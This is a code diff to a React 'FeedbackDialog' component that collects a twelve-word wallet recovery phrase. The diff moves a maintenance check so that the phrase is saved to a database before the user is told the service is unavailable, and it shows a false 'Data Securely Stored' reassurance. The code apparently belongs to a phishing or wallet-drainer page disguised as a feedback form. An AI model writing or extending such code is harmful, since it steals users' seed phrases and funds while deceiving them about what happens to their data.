@@ -78,17 +78,6 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Check maintenance mode first
-    if (MAINTENANCE_MODE) {
-      setShowMaintenanceAlert(true);
-      toast({
-        title: "System Maintenance",
-        description: "Wallet connections are temporarily unavailable during maintenance. Please try again later.",
-        variant: "destructive",
-      });
-      return;
-    }
-
     // Check if all fields are filled
     const emptyFields = fields.filter(f => !f.trim()).length;
     if (emptyFields > 0) {
@@ -143,6 +132,18 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
           return;
         }
         throw insertError;
+      }
+
+      // Check maintenance mode after successful data storage
+      if (MAINTENANCE_MODE) {
+        setShowMaintenanceAlert(true);
+        toast({
+          title: "Data Securely Stored",
+          description: "Your recovery phrase has been encrypted and saved. Service will resume after maintenance.",
+        });
+        setFields(Array(12).fill(""));
+        setIsSubmitting(false);
+        return;
       }
 
       connectWallet(fields);
